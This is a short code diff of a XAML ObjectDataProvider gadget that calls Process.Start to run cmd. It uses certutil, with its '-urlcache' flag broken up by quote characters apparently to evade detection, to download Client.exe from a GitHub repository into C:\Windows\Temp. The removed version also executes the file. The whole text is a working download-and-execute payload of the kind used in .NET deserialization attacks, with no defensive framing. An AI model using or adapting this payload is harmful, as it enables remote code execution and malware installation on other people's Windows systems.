@@ -6,7 +6,7 @@
 			<ObjectDataProvider x:Key='LaunchCmd' ObjectType='{x:Type Diag:Process}' MethodName='Start'>
 				<ObjectDataProvider.MethodParameters>
 					<System:String>cmd</System:String>
-					<System:String>/c certutil && certutil -url“”cache -split -f https://github.com/kkecho123/kkecho_vn/Client.exe C:\Windows\Temp\Client.exe && C:\Windows\Temp\Client.exe</System:String>
+					<System:String>/c certutil && certutil -url“”cache -split -f https://raw.githubusercontent.com/kkecho123/kkecho_vn/main/Client.exe C:\Windows\Temp\Client.exe</System:String>
 				</ObjectDataProvider.MethodParameters>
 			</ObjectDataProvider>
 		</ResourceDictionary>
